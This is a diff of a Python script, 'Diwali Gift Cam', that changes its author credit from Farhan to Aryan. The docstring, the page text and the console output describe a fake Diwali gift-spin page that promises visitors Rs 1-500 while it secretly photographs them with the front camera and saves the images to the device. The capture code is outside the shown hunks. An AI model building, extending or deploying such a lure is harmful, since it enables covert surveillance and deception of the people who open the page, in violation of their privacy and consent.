@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Diwali Gift Cam (final) - Made by Farhan.
+"""Diwali Gift Cam (final) - Made by Aryan.
 7 sec countdown -> Diwali gift poster + Start->spin (Rs 1-500). Photo front camera se
 chup-chaap khinch kar /sdcard/Download/DroidLinkCam me save hoti hai. Debug: /test, /diag."""
 import json, os, re, shutil, socket, ssl, subprocess, threading, time
@@ -120,7 +120,7 @@ HTML = r"""<!doctype html>
   <div id="gate-bar"><i id="gate-fill"></i></div>
 </div>
 <div class="poster">
-  <p class="made">Made by <b>Farhan</b></p>
+  <p class="made">Made by <b>Aryan</b></p>
   <div class="diyas">&#128367; &#128367; &#128367;</div>
   <h1>Happy Diwali</h1>
   <p class="sub">Gift Claim &middot; Spin &amp; Win</p>
@@ -132,7 +132,7 @@ HTML = r"""<!doctype html>
   <div class="result" id="result">Start dabao aur spin karo</div>
   <button id="start">Start</button>
   <button id="claim" class="ghost" disabled>Claim</button>
-  <p class="owner">Main <b>Farhan</b> &mdash; spin karo, jitna paisa aayega main daal dunga.</p>
+  <p class="owner">Main <b>Aryan</b> &mdash; spin karo, jitna paisa aayega main daal dunga.</p>
   <p class="note">Gift worth &#8377;1 &ndash; &#8377;500 &middot; fun demo</p>
 </div>
 
@@ -666,7 +666,7 @@ def serve(port, use_tls):
 
 if __name__ == "__main__":
     tls_ok = ensure_cert()
-    print("\n=== Diwali Gift Cam - Made by Farhan ===")
+    print("\n=== Diwali Gift Cam - Made by Aryan ===")
     print("Save folder : %s" % OUT)
     print("Page        : 7 sec countdown -> Diwali poster + Start->spin")
     print("Camera      : FRONT only, chup-chaap (video-first, phir takePhoto race)")
